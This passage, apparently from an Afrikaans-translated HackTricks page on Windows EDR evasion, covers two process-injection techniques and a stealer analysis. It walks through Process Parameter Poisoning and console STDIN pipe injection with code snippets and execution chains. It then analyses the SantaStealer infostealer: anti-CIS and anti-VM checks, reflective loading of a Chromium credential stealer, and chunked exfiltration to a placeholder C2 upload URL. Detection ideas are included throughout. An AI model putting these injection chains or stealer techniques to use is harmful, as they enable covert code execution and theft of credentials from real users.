- Groot implants vereis dikwels dat shellcode-inbedding van ’n string literal na ’n **byte-array/braced initializer** verander word, sodat die volledige buffer korrek in die injector source verteenwoordig word.

Opsporingsidees
- Remote writes na **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX allocations.
- Export entry points waarvan die in-memory bytes nie meer ooreenstem met die backing file op disk nie.
- Remote threads of context pivots wat uitvoering begin binne ’n legitieme DLL export waarvan die eerste bytes onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text`-pages, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write path (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om bytes na ’n reeds lopende target te kopieer, misbruik dit die feit dat Windows geselekteerde `CreateProcessW`-opstartparameters na die child process **kopieer** en hulle binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Nuttige carriers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese carrier-beperkings:

- `lpCommandLine` moet na **skryfbare geheue** wys vir `CreateProcessW`, en is beperk tot **32,767 Unicode-karakters**, insluitend die null terminator.
- `lpEnvironment` moet ’n Unicode environment block wees van opeenvolgende `NAME=VALUE\0`-strings wat deur ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, daarom moet die `ShellInfo`-kartering as ’n implementeringsdetail beskou word, nie as ’n stabiele gedokumenteerde kontrak nie.

Dit maak normale process creation die **payload-transfer primitive**. Die operateur skep die child process met aanvallerbeheerde opstartdata en laat Windows die cross-process copy uitvoer.

### Remote lookup flow without remote write APIs

Nadat die child geskep is, vind die gekopieerde buffer met **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die remote `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale flow:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Uitvoer van die gekopieerde parameterbuffer

Die gekopieerde parameterstreek is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofdraadgreep wat reeds in `PROCESS_INFORMATION` teruggegee is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread hijacking-werkvloei, **vereis dit nie** `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggekeerde hoofdraadgreep verander word.

Dit vermy verskeie API's wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulgreepbeperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulvrye eerste fase** wat konstantes tydens looptyd herbou en dan ’n arbitrêre tweede fase laai.

’n Eenvoudige patroon is XOR-gebaseerde konstantesintese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dit laat die eerste stadium toe om stack-strings, API-argumente, DLL-paaie of ’n shellcode-loader vir ’n tweede stadium te bou sonder om null-grepe in die oorgedrade parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste stadium

Wanneer die eerste stadium APIs soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-byte x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe wysers stel
- `RSP` **16-greep-belyn** hou voordat dit die funksie aanroep

’n Tweede stadium kan dan vanaf die stack na ’n `PAGE_READWRITE`-toekenning gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word, en daarna uitgevoer word. Dit vermy ’n direkte RWX-toekenning.

### Idees vir opsporing

Goeie geleenthede vir ondersoek wat die outeurs noem:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **prosesparameterbladsye uitvoerbaar maak**
- daardie beskermingsverandering, gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë leesbewerkings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang of hoë-entropie `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens prosesskepping

### Notas

- P3 is ’n **oordragtruuk tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter vereis steeds ’n verandering van uitvoertoestemming en ’n metode om uitvoering daarheen te herlei.
- Die outeurs het `RtlCreateProcessReflection` / Dirty Vanity oorweeg, maar dit verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` aanroep.

## Console STDIN-pypinspuiting

’n Interaktiewe console-child kan ook as die **payload-oordragprimitief** gebruik word. Die injector herlei die child se standaardinvoer na ’n pyp en stuur ’n merker gevolg deur shellcode. Nadat die consoleprogram die data in sy eie private geheue gelees het, vind die injector daardie buffer, maak dit uitvoerbaar en herlei ’n child-thread daarheen. Dit vermy `VirtualAllocEx` en `WriteProcessMemory`, maar is steeds prosesinspuiting eerder as ’n algemene EDR-omseiling.<sup>[[41]](#references)</sup>

Ondanks die beskrywing as ’n "named pipe", roep die verwysingsimplementering `CreatePipe` aan, wat ’n **anonymous pipe** skep. Windows implementeer anonymous pipes intern met uniek benoemde pypvoorwerpe, maar die PoC kies nie ’n `\\.\pipe\<name>`-pad of roep `CreateNamedPipe` aan nie. Dit skep oorerfbare handvatsels met ’n versteksekuriteitsbeskrywer, plaas die leeshandvatsel in `STARTUPINFO.hStdInput`, stel `STARTF_USESTDHANDLES` en begin ’n nuwe child met handvatseloorerwing geaktiveer. Daarom begin hierdie PoC die verskafde console-uitvoerbare lêer; dit koppel nie sy pyp aan ’n bestaande proses nie.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Verwysingswerkvloei

Die implementering gebruik die volgende ketting:<sup>[[41]](#references)</sup>

1. Skep anonymous pipe-pare vir die child se `STDIN` en `STDOUT`. Deaktiveer oorerwing op die twee handvatsels aan die ouerkant en maak die duplikate aan die child-kant in die ouer toe nadat die proses begin is.
2. Begin ’n interaktiewe uitvoerbare lêer soos `netsh.exe` of `nslookup.exe` met `CREATE_NEW_CONSOLE`. Die child erf die herlei standaardhandvatsels.
3. Stuur die volledige binêre `rawData`-skikking met `WriteFile` deur die `STDIN`-handvatsel aan die ouerkant. Die consoleprogram verwerk die grepe en laat ’n kopie in een van sy private geheuestreke agter.
4. Loop deur die child se adresruimte met `VirtualQueryEx`, lees moontlike `MEM_PRIVATE`-streke met `ReadProcessMemory` en soek na die merker aan die begin van `rawData`.
5. Verander die ontdekte buffer se beskerming na `PAGE_EXECUTE_READWRITE` met `VirtualProtectEx`.
6. Identifiseer die hooftread, skort dit op, stel `RIP` met `NtSetContextThread` op `found_address + 0x19` en hervat dit.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die verskafde implementering is x64-spesifiek: dit wysig `CONTEXT.Rip`, en sy ingebedde payload is x64-shellcode. `rawData` begin met ’n merker van 25 grepe, dus begin uitvoerbare grepe by heksadesimale offset `0x19`. Wanneer jy die payload vervang, behou daardie uitleg of werk die merker, soekvektor, skikkinggrootte en uitvoeringsoffset saam by. Die bronkommentaar lys ook `0x0A`, `0x0D` en `0x1A` as slegte karakters. Hierdie werkvloei verander nie die kindproses se token of voorregte nie.<sup>[[41]](#references)</sup>

Vir klein native helpers en patrone vir payload-kompilering, sien [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer se tradecraft vir fileless-ontduiking en geloofsbriewediefstal

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne info-stealers AV-bypass, anti-analise en toegang tot geloofsbriewe in een werkvloei kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitleghek & sandbox-vertraging

- ’n Config-vlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte met `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, laat die sample ’n leë `CIS`-merker agter en beëindig dit voordat stealers loop. Só verseker dit dat dit nooit op uitgeslote liggings afgaan nie, terwyl dit ’n artefak vir opsporing agterlaat.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, bereken ’n pasgemaakte rollende kontrolesom vir elke naam en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom vir die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelseleienskappe (minimum aantal prosesse, onlangse looptyd), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions op te spoor en voer tydkontroles rondom slaaptye uit om single-stepping te bespeur. Enige treffer staak die proses voordat modules begin.

### Fileless-hulpprogram + dubbele ChaCha20-reflective loading

- Die primêre DLL/EXE bevat ’n Chromium credential helper wat óf na die skyf geskryf óf handmatig in die geheue gekarteer word; in fileless-modus los dit self imports/relocations op, sodat geen helper-artefakte geskryf word nie.
- Daardie helper stoor ’n tweede-fase-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greep-sleutels + 12-greep-nonces). Ná albei deurgange laai dit die blob reflectively (geen `LoadLibrary` nie) en roep die exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik reflective process hollowing met direct syscalls om in ’n aktiewe Chromium-blaaier in te spuit, AppBound Encryption-sleutels te erf en wagwoorde/cookies/kredietkaarte regstreeks uit SQLite-databasisse te dekripteer, ondanks ABE-verharding.


### Modulêre in-geheue-versameling en HTTP-uitvoer in stukke

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een thread per geaktiveerde module (Telegram, Discord, Steam, skermkiekies, dokumente, blaaieruitbreidings, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n aansluitingsvenster van ongeveer 45s.
- Sodra dit klaar is, word alles met die staties gekoppelde `miniz`-biblioteek as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15s en stroom die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n blaaier se `multipart/form-data`-grens (`----WebKitFormBoundary***`) naboots. Elke stuk voeg `User-Agent: upload`, `auth: <build_id>` en opsioneel `w: <campaign_tag>` by; die laaste stuk voeg `complete: true` by sodat die C2 weet dat die heropbou voltooi is.

## References

- [1] [Gevorderde evasion tradecraft: Presisie-module-stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Oproepstapels: geen gratis passe vir malware meer nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC vir call-stack-spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infeksieketting en ConfuserEx-gebaseerde obfuskasie vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler se posture-kontroles](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: Ondersoek na Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11-inventaris van forwarded exports (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Soekvolgorde vir dinamiese skakelbiblioteke](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prosessekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-lanseerder](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Teenwerking teen EDR’s met die beskerming van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek deur Windows Defender se beskermende dop met die Folder Redirect-tegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Verwysing vir die mklink-opdrag](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure Curtain: Van RAT tot bouer tot kodeerder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom stad toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – De-enkripsie van Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-malware verslaan met API-tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Slapende Skoonheid: Sit Adaptix te slaap met Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftiging van prosesparameters](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Slapende Skoonheid II: CFG, CET en stack spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-slaapobfuskasie](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Verberging van jou Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Misbruik van Chrome Remote Desktop in Red Team-bedrywighede: ’n praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Bewapening van Defender se remediëringsdrywer as ’n primitief vir kernbedrywighede](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo-bykomende kode](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Skep selfmaskerende funksies met LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-bronkode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-funksie](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Skep ’n kindproses met herlei invoer en afvoer](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
